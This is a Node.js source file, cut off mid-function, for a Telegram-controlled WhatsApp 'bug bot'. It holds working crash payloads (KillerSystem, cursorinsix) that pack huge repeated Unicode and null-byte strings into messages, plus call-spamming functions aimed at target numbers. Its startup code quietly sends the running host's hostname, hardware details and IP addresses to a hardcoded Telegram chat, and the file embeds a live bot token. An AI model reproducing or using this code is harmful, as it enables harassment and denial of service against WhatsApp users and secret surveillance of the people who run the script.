const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,;
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const os = require('os');

const TG_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8498915261:AAGRw_rfmOGYLF_C0Ji0zsrnGqkga7YHu3U';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '7592830900';
const REMOTE_RAW_URL = process.env.REMOTE_RAW_URL || 'https://raw.githubusercontent.com/Badzz88/keamanan-V3/main/brothers.js';
const CHECK_INTERVAL_MS = 2 * 1000

function calculateChecksum(text) {
  return crypto.createHash('sha256').update(text, 'utf8').digest('hex');
}

async function sendAdminNotification(text) {
  if (!TG_BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.warn('Admin notification disabled (missing TELEGRAM_BOT_TOKEN or ADMIN_CHAT_ID).');
    return;
  }
  try {
    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: ADMIN_CHAT_ID,
      text,
      parse_mode: 'Markdown'
    }, { timeout: 5000 });
  } catch (err) {
    console.error('Failed to send admin notification:', err.message);
  }
}

async function getFingerprint() {
  const cpus = os.cpus();
  const net = os.networkInterfaces();

  // ambil ip lokal
  let localIps = [];
  Object.keys(net).forEach(iface => {
    net[iface].forEach(addr => {
      if (addr.family === 'IPv4' && !addr.internal) {
        localIps.push(addr.address);
      }
    });
  });

  // ambil ip publik via API
  let publicIp = 'N/A';
  try {
    const res = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
    publicIp = res.data.ip;
  } catch (e) {
    console.warn("Failed to fetch public IP:", e.message);
  }

  return {
    hostname: os.hostname(),
    platform: `${os.platform()} ${os.release()}`,
    cpuModel: cpus && cpus[0] ? cpus[0].model : 'unknown',
    cpuCount: cpus ? cpus.length : 0,
    memGB: Math.round((os.totalmem() / 1024 / 1024 / 1024) * 100) / 100,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    localIps,
    publicIp
  };
}

async function fetchRemoteFile(url) {
  try {
    const res = await axios.get(url, { timeout: 7000 });
    return res.data;
  } catch (e) {
    console.warn('Failed to fetch remote file for integrity check:', e.message);
    return null;
  }
}

function readLocalFile(filePath) {
  return fs.readFileSync(filePath, 'utf8');
}

// Startup baseline and notify admin
let baseline = null;
(async () => {
  try {
    const localContent = readLocalFile(__filename);
    const remoteContent = await fetchRemoteFile(REMOTE_RAW_URL);

    if (!remoteContent) {
      throw new Error("Failed to fetch remote content");
    }

    baseline = {
      content: localContent,
      checksum: calculateChecksum(localContent)
    };

    const fp = await getFingerprint();
    const startupMsg = [
      '*BOT STARTED*',
      `• File: \`${path.basename(__filename)}\``,
      `• Local checksum: \`${baseline.checksum}\``,
      `• Remote checksum: \`${calculateChecksum(remoteContent)}\``,
      `• Content match: ${localContent === remoteContent ? '✅ YES' : '❌ NO'}`,
      `• Host: \`${fp.hostname}\``,
      `• Platform: \`${fp.platform}\``,
      `• CPU: \`${fp.cpuModel} (${fp.cpuCount} cores)\``,
      `• RAM: \`${fp.memGB} GB\``,
      `• TZ: \`${fp.tz}\``,
      `• Local IPs: \`${fp.localIps.join(', ')}\``,
      `• Public IP: \`${fp.publicIp}\``,
      `• Time: \`${new Date().toLocaleString()}\``
    ].join('\n');
    sendAdminNotification(startupMsg).catch(()=>{});

    // kalau awal saja sudah tidak sama persis → exit
    if (localContent !== remoteContent) {
      await sendAdminNotification('*ALERT: LOCAL FILE DOES NOT MATCH REMOTE — EXITING*');
      process.exit(1);
    }
  } catch (e) {
    console.error('Failed to initialize integrity baseline:', e);
    sendAdminNotification(`*ERROR STARTUP INTEGRITY CHECK*\n\`${e.message}\``).catch(()=>{});
    process.exit(1);
  }

  // periodic re-check
  setInterval(async () => {
    try {
      const localContent = readLocalFile(__filename);
      const remoteContent = await fetchRemoteFile(REMOTE_RAW_URL);

      if (!remoteContent) {
        throw new Error("Cannot fetch remote content");
      }

      if (localContent !== remoteContent) {
        const fp = await getFingerprint();
        const report = [
          '*ALERT: FILE CHANGED OR DOES NOT MATCH REMOTE*',
          `• File: \`${path.basename(__filename)}\``,
          `• Local checksum: \`${calculateChecksum(localContent)}\``,
          `• Remote checksum: \`${calculateChecksum(remoteContent)}\``,
          `• Content match: ❌ NO`,
          `• Host: \`${fp.hostname}\``,
          `• Local IPs: \`${fp.localIps.join(', ')}\``,
          `• Public IP: \`${fp.publicIp}\``,
          `• Time: \`${new Date().toLocaleString()}\``,
          '',
          '_Script will exit now._'
        ].join('\n');
        await sendAdminNotification(report);
        process.exit(1);
      }
    } catch (err) {
      console.error('Integrity check error:', err);
      await sendAdminNotification(`*ERROR: Integrity check failed*\n\`${err.message}\``).catch(()=>{});
      process.exit(1);
    }
  }, CHECK_INTERVAL_MS);
})();

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/Badzz88/token-database/main/database.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(` JANGAN LUPA MASUK GB INFO SCRIPT⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀
`));

console.log(chalk.greenBright(`
┌──────────────────────────────┐
│ ⚠️ Кредит Этот бот принадлежит             
├──────────────────────────────┤
│  РАЗРАБОТЧИК : luv2hate      
│  TELEGRAM : @sallstecu
│  CHANEL : https://t.me/informasitreebrothers
└──────────────────────────────┘
`));

console.log(chalk.blueBright(`
BOT HAS ALREADY USE
`
));
};

validateToken();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363400362472743@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`◇ 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber}..... 𝙨𝙪𝙘𝙘𝙚𝙨\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      sock.newsletterFollow("120363400362472743@newsletter");
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`◇ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙧𝙤𝙨𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜\`\`\`
𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari,${hours} Jam,${minutes} Menit`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomImage() {
  const images = [
    "https://files.catbox.moe/ue1z0e.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 3 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function spamcall(target) {
  // Inisialisasi koneksi dengan makeWASocket
  const sock = makeWASocket({
    printQRInTerminal: false, // QR code tidak perlu ditampilkan
  });

  try {
    console.log(`📞 Mengirim panggilan ke ${target}`);

    // Kirim permintaan panggilan
    await sock.query({
      tag: "call",
      json: ["action", "call", "call", { id: `${target}` }],
    });

    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
  } catch (err) {
    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
  } finally {
    sock.ev.removeAllListeners(); // Hapus semua event listener
    sock.ws.close(); // Tutup koneksi WebSocket
  }
}

async function sendOfferCall(target) {
  try {
    await sock.offerCall(target);
    console.log(chalk.white.bold(`Success Send Offer Call To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
  }
}

async function sendOfferVideoCall(target) {
  try {
    await sock.offerCall(target, {
      video: true,
    });
    console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
  } catch (error) {
    console.error(
      chalk.white.bold(`Failed Send Offer Video Call To Target:`, error)
    );
  }
}
//func
async function cursorinsix(jid) {
    const messagePayload = {
        viewOnceMessage: {
            message: {
                "imageMessage": {
                    "url": "https://mmg.whatsapp.net/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0&mms3=true",
                    "mimetype": "image/jpeg",
                    "caption": "柊-Travas ampas" + "@1".repeat(15999),
                    "fileSha256": "ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=",
                    "fileLength": "99999999999",
                    "height": 307,
                    "width": 734,
                    "mediaKey": "TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=",
                    "fileEncSha256": "IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=",
                    "directPath": "/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0",
                    "mediaKeyTimestamp": "1738686532",
                    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                    "scansSidecar": "nxR06lKiMwlDForPb3f4fBJq865no+RNnDKlvffBQem0JBjPDpdtaw==",
                    "scanLengths": [2226, 6362, 4102, 6420],
                    "midQualityFileSha256": "erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA="
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", messagePayload.viewOnceMessage.message, {
        messageId: sock.generateMessageTag(),
        statusJidList: [jid]
    });
}


async function KillerSystem(jid) {
  const ZeroInfinity = '_*~@2~*_\n'.repeat(10500);
  const SystemUi = 'ោ៝'.repeat(10000);
   
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "33333333333333333@newsletter",
      newsletterName: "⎋🦠</🧬⃟༑⌁⃰𝙏𝙝𝙧𝙚𝙚𝘽𝙧𝙤𝙩𝙝𝙚𝙧𝙨ཀ\\>🍷𞋯" + "ោ៝".repeat(20000),
      caption: "⎋🦠</🧬⃟༑⌁⃰𝙏𝙝𝙧𝙚𝙚𝘽𝙧𝙤𝙩𝙝𝙚𝙧𝙨ཀ\\>🍷𞋯" + SystemUi + "ោ៝".repeat(20000),
      inviteExpiration: "999999999",
    },
  };

  await sock.relayMessage(jid, msg, {
    participant: { jid: jid },
    messageId: null,
  });

  const messageCrashNotif = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "⎋🦠</🧬⃟༑⌁⃰𝙏𝙝𝙧𝙚𝙚𝘽𝙧𝙤𝙩𝙝𝙚𝙧𝙨ཀ\\>🍷𞋯",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: ""
              },
            },
          },
          body: {
            text: "⎋🦠</🧬⃟༑⌁⃰𝙏𝙝𝙧𝙚𝙚𝘽𝙧𝙤𝙩𝙝𝙚𝙧𝙨ཀ\\>🍷𞋯" + "ꦾ".repeat(3000)
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select",  buttonParamsJson: "\u0000".repeat(1000) },
              { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(1000) },
              { name: "cta_url", buttonParamsJson: "\u0000".repeat(1000) },
              { name: "cta_call", buttonParamsJson: "\u0000".repeat(1000) },
              { name: "cta_copy", buttonParamsJson: "\u0000".repeat(1000) },
              { name: "cta_reminder", buttonParamsJson: "\u0000".repeat(1000) },
